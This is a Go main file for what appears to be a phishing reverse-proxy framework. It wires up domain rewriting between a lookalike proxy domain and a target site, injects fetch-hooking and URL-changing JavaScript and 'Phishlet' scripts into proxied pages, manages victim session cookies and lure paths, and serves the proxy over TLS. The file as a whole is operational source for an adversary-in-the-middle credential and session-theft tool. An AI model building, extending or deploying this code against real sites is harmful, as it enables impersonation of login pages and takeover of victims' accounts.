package main

import (
	_ "embed"
	"flag"
	"fmt"
	"io/fs"
	"log"
	"net"
	"net/http"
	"os"
	"runtime/debug"
	"strings"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/middleware/recover"
	"github.com/gofiber/fiber/v2/middleware/session"
	"github.com/gofiber/fiber/v2/utils"
	"github.com/gofiber/storage/memory"
)

//go:embed js/change-url.js
var changeURLScript string

//go:embed js/fetch-hook.js
var fetchHookScript string

func setupHTTPClient() *http.Client {
	// DefaultTransport without ForceAttemptHTTP2 (temporarily disable HTTP2)
	// TODO enable http2 as soon as the bug https://github.com/golang/go/issues/47882 is fixed
	return &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyFromEnvironment,
			DialContext: (&net.Dialer{
				Timeout:   30 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
			MaxIdleConns:          100,
			IdleConnTimeout:       90 * time.Second,
			TLSHandshakeTimeout:   10 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
		},
	}
}

func setupDomainConverter(conf *appConfig) DomainConverter {
	conv := NewDomainConverter(conf.DomainNameWithPort)
	conv.AddStaticMapping("www.w3.org", "www.w3.org")
	for _, pair := range conf.StaticDomainMappings {
		conv.AddStaticMapping(pair.Proxy, pair.Target)
	}
	return conv
}

func setupRequestProcessor(conv DomainConverter) RequestProcessor {
	requestURLProc := newURLRegexProcessor(func(domain string) string {
		return conv.ToTargetDomain(domain)
	})
	return NewRequestProcessor(conv, requestURLProc)
}

func setupResponseProcessor(conf *appConfig, conv DomainConverter) ResponseProcessor {
	baseScript := fmt.Sprintf(`
	var baseDomain = "%s"
	var apiURL = "https://%s"`, conf.DomainNameWithPort, conf.APIHostname)
	scripts := []string{baseScript, changeURLScript, fetchHookScript}
	scripts = append(scripts, conf.Phishlet.JsFilesBody...)
	injectScript := strings.Join(scripts, "\n")
	htmlProc := newHTMLRegexProcessor(conv, injectScript)
	responseURLProc := newURLRegexProcessor(func(domain string) string {
		return conv.ToProxyDomain(domain)
	})
	return NewResponseProcessor(conv, responseURLProc, htmlProc)
}

func setupProxyHandler(conf *appConfig, conv DomainConverter) fiber.Handler {
	client := setupHTTPClient()
	req := setupRequestProcessor(conv)
	resp := setupResponseProcessor(conf, conv)
	return NewProxyHandler(client, req, resp)
}

func setupAuthHandler(conf *appConfig, conv DomainConverter) fiber.Handler {
	cookieManager := NewCookieManager()
	storage := NewSessionStorage(memory.New(), cookieManager)
	store := session.New(session.Config{
		Expiration:     conf.SessionExpiration,
		KeyLookup:      "cookie:" + conf.SessionCookieName,
		CookieDomain:   conf.DomainName,
		CookieSecure:   true,
		CookieHTTPOnly: true,
		Storage:        storage,
	})
	return NewAuthMiddleware(AuthConfig{
		CookieName:     conf.SessionCookieName,
		CookieManager:  cookieManager,
		Store:          store,
		InvalidAuthURL: conf.Phishlet.InvalidAuthURL,
		LoginURL:       conv.ToProxyURL(conf.Phishlet.LoginURL),
		LureService:    NewStaticLureService([]string{"/abc/def"}),
	})
}

func setupApp(api, auth, proxy fiber.Handler) *fiber.App {
	app := fiber.New(fiber.Config{
		StreamRequestBody:     true,
		DisableStartupMessage: true,
		IdleTimeout:           10 * time.Second,
	})

	app.Use(recover.New(recover.Config{
		EnableStackTrace: true,
		StackTraceHandler: func(e interface{}) {
			log.Println("panic: ", e)
			log.Println("stack: ", utils.UnsafeString(debug.Stack()))
		},
	}))

	// allowed HTTP methods with auth
	httpMethods := []string{
		fiber.MethodGet,
		fiber.MethodHead,
		fiber.MethodPost,
		fiber.MethodPut,
		fiber.MethodDelete,
		fiber.MethodPatch,
	}
	for _, method := range httpMethods {
		app.Add(method, "/*", auth, api, proxy)
	}
	// for CORS preflight requests
	app.Options("/*", api, proxy)
	return app
}

type hostFS struct{}

func (hostFS) Open(name string) (fs.File, error) {
	return os.Open(name)
}

func main() {
	var configFile, envFile string
	flag.StringVar(&configFile, "c", "", "yaml config file")
	flag.StringVar(&envFile, "e", "", "dotenv config file")
	flag.Parse()
	if envFile == "" {
		if _, err := os.Stat(".env"); err == nil {
			envFile = ".env"
		}
	}

	fsys := &hostFS{}
	conf, err := setupAppConfig(fsys, configFile, envFile)
	if err != nil {
		log.Fatal(err)
	}

	conv := setupDomainConverter(conf)
	api := NewAPIMiddleware(APIConfig{
		APIHostname:     conf.APIHostname,
		DomainConverter: conv,
	})
	auth := setupAuthHandler(conf, conv)
	proxy := setupProxyHandler(conf, conv)

	app := setupApp(api, auth, proxy)
	if err := app.ListenTLS(conf.ListenAddr, conf.TLSCert, conf.TLSKey); err != nil {
		log.Println("listen error", err)
	}
}
